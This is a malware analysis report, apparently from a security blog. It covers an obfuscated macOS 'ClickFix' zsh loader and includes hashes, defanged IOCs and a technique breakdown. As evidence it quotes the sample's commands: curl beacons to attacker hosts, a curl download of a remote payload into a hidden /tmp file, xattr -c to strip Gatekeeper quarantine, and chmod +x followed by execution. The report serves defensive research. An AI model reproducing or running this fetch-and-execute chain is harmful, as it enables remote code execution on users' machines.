---
title: "Malware Sample Analysis: macOS ClickFix zsh loader (SHub candidate) (other · zsh · a9ee0d03)"
published: 2026-11-25
draft: false
description: "Malicious (low confidence): macOS ClickFix zsh loader (SHub candidate) · downloader/dropper · difficulty easy · pure static analysis"
tags: ["macOS ClickFix", "downloader", "dropper", "Script"]
category: "恶意样本日报"
lang: "en"
translationOf: "2026-11-25-macOS-ClickFix-zsh-loader-SHub-候选-a9ee0d03"
---

> [!WARNING]
> **Verdict: malicious** · Family **macOS ClickFix zsh loader (SHub candidate)** (suspected) · Confidence **low**
> 
> Aliases: SHub, paste-and-run macOS stager, MacClickFix
> 
> The sample is a zsh script obfuscated with octal strings: it first derives an AES-128-CTR key from md5("115"), decrypts the built-in hex ciphertext and gunzips it to obtain a directly readable stage-2 script; stage 2 reports event=pasted to shelter51[.]com, then downloads an executable from scope68[.]com to /tmp/.gvcgn67.$$, renames it, clears the macOS quarantine attribute (xattr -c), chmod +x and executes it directly, then reports back event=stager. The chain of downloading and executing remote code is complete and directly proven by the sample's own code.

## Overview

| Item | Content |
|:--|:--|
| Family | **macOS ClickFix zsh loader (SHub candidate)** · Aliases SHub, paste-and-run macOS stager, MacClickFix · _suspected_ |
| Confidence | **Low** |
| Behavior class | downloader · dropper |
| Difficulty | easy |
| First seen | 2026-11-23 16:27:34 |
| Analysis method | Pure static analysis |
| Source | [MalwareBazaar](https://bazaar.abuse.ch/sample/a9ee0d035916b58028618accc7308be6d0b6b356b011137d70c84cd2bbc8caf8/) |

## Attack chain

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="Attack chain overview" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">Decrypt built-in stage-2 payload</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1140</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="84" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">Octal-encoded obfuscated commands</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1027</text>
<text x="613" y="88" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">Fake probe logs</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1036</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">Report paste-and-run event</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">Download remote stage 2</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1105</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
</svg>

## Sample identification

| Item | Value |
|:--|:--|
| SHA-256 | `a9ee0d035916b58028618accc7308be6d0b6b356b011137d70c84cd2bbc8caf8` |
| MD5 | _not recorded_ |
| Size | 2,706 bytes (2.6 KB) |
| Type | other · `zsh` |

## Behavior analysis

**10** behaviors in total, each with attached evidence, all obtainable statically.

### 1. Decrypt built-in stage-2 payload

`T1140` · Confidence **high** · Static

The script computes md5 with _kb=115 as input as the AES-128-CTR key, restores three hex strings via xxd -r -p and decrypts them, then gunzips to obtain the stage-2 zsh script.

> **Evidence**: _k=$(printf '%s' "$_kb" | md5); openssl enc -d -aes-128-ctr -K $_k -iv 0; gunzip; _kb=6*2+6%97+97=115
> 
> **Source**: `ref:6772292def` · `ref:03a1d01430`

### 2. Octal-encoded obfuscated commands

`T1027` · Confidence **high** · Static

Command names such as md5, xxd, openssl, gunzip, curl, xattr and chmod and all URLs are stored as printf octal escapes and only restored at runtime, evading text-level static detection.

> **Evidence**: printf 'md5' and other octal strings; all stage-2 URLs are also octal
> 
> **Source**: `ref:6772292def` · `ref:16ac038b68` · `ref:6f7cf985c8`

### 3. Fake probe logs

`T1036` · Confidence **high** · Static

On startup the script prints probe finished / preflight ok and uses diagnostic-style variable names such as probe, suite, flavor and feature_flags to mask its download-and-execute behavior.

> **Evidence**: _log "probe finished"; _log "preflight ok"; _suite=manual; _flavor=weekly
> 
> **Source**: `ref:6772292def`

### 4. Report paste-and-run event

`T1071.001` · Confidence **high** · Static

It uses curl to POST in the background to shelter51[.]com/api/metrics/run?event=pasted, carrying user and BuildID headers, with stdout/stderr fully discarded.

> **Evidence**: curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST -H 'user: AgI7...' -H 'BuildID: AgLJ...' hxxps://shelter51[.]com/api/metrics/run?event=pasted
> 
> **Source**: `ref:16ac038b68` · `ref:377e5bd382`

### 5. Download remote stage 2

`T1105` · Confidence **high** · Static

It uses curl -fsSL to download a file from a fixed path on scope68[.]com to /tmp/.gvcgn67.$$.

> **Evidence**: curl -fsSL -o /tmp/.gvcgn67.$$ hxxps://scope68[.]com/f/hjyzam087lx6gnvy44p9wa/rs3v3bf2
> 
> **Source**: `ref:16ac038b68` · `ref:377e5bd382`

### 6. Clear quarantine attribute

`T1553.001` · Confidence **high** · Static

It runs xattr -c on the downloaded file, clearing the com.apple.quarantine extended attribute written by macOS Gatekeeper before execution.

> **Evidence**: xattr -c /tmp/.gvcgn67
> 
> **Source**: `ref:16ac038b68` · `ref:377e5bd382`

### 7. Grant permission and execute the downloaded file

`T1059.004` · Confidence **high** · Static

After chmod +x on the downloaded file it executes it directly as ${msqwgw}, handing control to the remote payload.

> **Evidence**: chmod +x /tmp/.gvcgn67 && /tmp/.gvcgn67
> 
> **Source**: `ref:16ac038b68` · `ref:377e5bd382`

### 8. Report execution completion

`T1071.001` · Confidence **high** · Static

After the payload executes it again POSTs in the background to shelter51[.]com/api/metrics/run?event=stager, using another set of user/BuildID identifiers.

> **Evidence**: curl -X POST -H 'user: AgIs...' -H 'BuildID: AgKn...' hxxps://shelter51[.]com/api/metrics/run?event=stager
> 
> **Source**: `ref:16ac038b68` · `ref:377e5bd382` · `ref:2bc6ca2809`

### 9. Use hidden temporary path

`T1036.005` · Confidence **high** · Static

Downloaded and dropped files use the dot-hidden filename .gvcgn67 under /tmp, written first as a temporary file with a PID suffix then renamed, reducing the chance of user discovery.

> **Evidence**: /tmp/.gvcgn67.$$ → mv → /tmp/.gvcgn67
> 
> **Source**: `ref:16ac038b68` · `ref:377e5bd382`

### 10. Clean up temporary files

`T1070.004` · Confidence **high** · Static

Stage 1 creates a runtime temp file with mktemp and deletes it on exit via trap 'rm -f "$_run_tmp"' EXIT, reducing on-disk traces.

> **Evidence**: _run_tmp=$(mktemp -t zbiuqn ...); trap 'rm -f "$_run_tmp"' EXIT
> 
> **Source**: `ref:6772292def`


## IOC (defanged)

### Network

:::caution
**Pending dynamic verification**: the above addresses come from static analysis; no successful connection or session was observed under the analysis environment's network isolation, and the real C2's responses and delivered content remain unknown.
:::

| Type | Value | Port | Role | Evidence source | Dynamic observation |
|:--|:--|--:|:--|:--|:--|
| http | `hxxps://shelter51[.]com/api/metrics/run?event=pasted` | 443 | c2 | Static | ⏳ Not observed |
| http | `hxxps://scope68[.]com/f/hjyzam087lx6gnvy44p9wa/rs3v3bf2` | 443 | download | Static | ⏳ Not observed |
| http | `hxxps://shelter51[.]com/api/metrics/run?event=stager` | 443 | c2 | Static | ⏳ Not observed |

### Host

**Drop paths**

- `/tmp/.gvcgn67.$$`
- `/tmp/.gvcgn67`

### Configuration

| Key | Value | Required | Evidence source |
|:--|:--|:--|:--|
| `c2_hosts` | `shelter51[.]com; scope68[.]com` | Yes | Static |
| `c2_port` | `443` | Yes | Static |
| `c2_uri` | `/api/metrics/run?event=pasted ; /api/metrics/run?event=stager ; /f/hjyzam087lx6gnvy44p9wa/rs3v3bf2` | Yes | Static |
| `encryption_algo` | `AES-128-CTR (key=md5('115')=2b44928ae11fb9384c4cf38708677c48, IV=all zeros, outer gzip)` | Yes | Static |
| `download_path` | `/tmp/.gvcgn67.$$ → /tmp/.gvcgn67` | Yes | Static |
| `http_headers` | `user / BuildID (two sets of base64url binary identifiers, used to distinguish pasted and stager requests)` | No | Static |
| `telemetry_events` | `pasted, stager` | Yes | Static |

## Do not misjudge

:::important
The following conclusions are **easy to misjudge**; please note when citing this report.

- Do not assert the final payload is ransomware or an infostealer merely because encryption and downloading appear; the content delivered by scope68[.]com was not obtained this time and the final functionality is unknown.
- Do not treat this script as Windows/PE malware; xattr and the /tmp path indicate it targets macOS.
- No real connection was established with shelter51[.]com or scope68[.]com; do not claim observed C2 sessions, response contents or victim data exfiltration.
- Do not read the base64url user/BuildID headers directly as readable campaign numbers or host identifiers; their content is binary and not decrypted.
:::

## Analysis method and limitations

| Item | Content |
|:--|:--|
| Analysis method | Pure static analysis |
| Unpacking | Yes (stage2 `9a727fa5f628f64df7b8eca1598990e5d7def2b2211b1edf8e3d71ecccf3e0fc`) |

**Limitations and pending verification**

1. This is pure static analysis; the sample was not executed and no real connection was established with shelter51[.]com/scope68[.]com; the downloaded payload, C2 responses and final family were not observed.
2. The stage-2 script was recovered only by static decryption and de-obfuscation, not verified at runtime.
3. user/BuildID are base64url-encoded binary identifiers with no readable fields after decoding; victim or campaign numbers cannot be confirmed from them.
4. The final payload's hash, behavior and family cannot be determined, so the family attribution is only a candidate with low confidence.

## Evidence index

<details>
<summary>Expand 7 tool evidence items</summary>

| Evidence ID | Tool | Summary |
|:--|:--|:--|
| `ref:857f2a403b` | file/hash | confirms the sample is a 2706-byte zsh script, path and given SHA-256 consistent. |
| `ref:6772292def` | static-read | reads the stage-1 script, identifies the md5/xxd/openssl/gunzip decryption chain and the _kb=115 key derivation. |
| `ref:03a1d01430` | python-decrypt | per sample logic decrypts with md5('115') as AES-128-CTR key and gunzips, successfully recovering a 1694-byte stage-2 script. |
| `ref:16ac038b68` | static-read | reads the stage-2 script, confirms curl reporting, downloading, xattr -c, chmod +x and the execution chain. |
| `ref:377e5bd382` | python-deobf | restores all octal strings of stage 2, obtaining plaintext URLs, paths and request headers. |
| `ref:2bc6ca2809` | python-decode | base64url-decodes the user/BuildID headers, results are 33/39-byte binary with no readable text. |
| `ref:84db5bd148` | python-hash | computes the sample file's SHA-256/MD5 and enumerates the hex constants embedded in stage 1. |

</details>

---

_The sample in this report is not public; IOCs are defanged; for security research only._
